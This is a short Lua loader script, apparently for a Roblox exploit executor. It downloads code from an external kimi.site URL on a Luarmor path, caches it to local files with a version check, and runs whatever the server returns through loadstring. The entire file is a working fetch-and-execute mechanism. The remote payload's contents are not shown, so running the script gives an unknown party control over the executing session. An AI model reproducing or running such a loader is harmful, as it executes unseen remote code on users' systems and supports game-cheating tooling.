local URL     = "https://bsq56imi5su7w.kimi.site/luarmor/t/c898cf3998c6"
local CACHE   = "luarmor_cache.lua"
local VER     = "luarmor_ver.txt"

local HttpGet = game.HttpGet or game.HttpGetAsync
local Write   = writefile or function(p, c) end
local Read    = readfile  or function(p) return nil end
local IsFile  = isfile    or function(p) return false end
local Exec    = loadstring

local ok, remoteVer = pcall(function()
    return HttpGet(game, URL .. "?v=1"):sub(1, 64)
end)

if ok and remoteVer and IsFile(CACHE) and IsFile(VER) and Read(VER) == remoteVer then
    local src = Read(CACHE)
    if type(src) == "string" and #src > 0 then
        local chunk, err = Exec(src)
        if chunk then pcall(chunk) return else warn("cache chunk error: " .. tostring(err)) end
    end
end

local okFull, src = pcall(function()
    return HttpGet(game, URL)
end)

if not okFull or type(src) ~= "string" or #src < 16 then
    warn("fetch failed, fallback to raw exec")
    return
end

local sig = src:sub(1, 16)

pcall(function()
    Write(CACHE, src)
    Write(VER, remoteVer or sig)
end)

local chunk, err = Exec(src)
if not chunk then
    warn("compile error: " .. tostring(err))
    return
end

local okRun, runErr = pcall(chunk)
if not okRun then
    warn("runtime error: " .. tostring(runErr))
end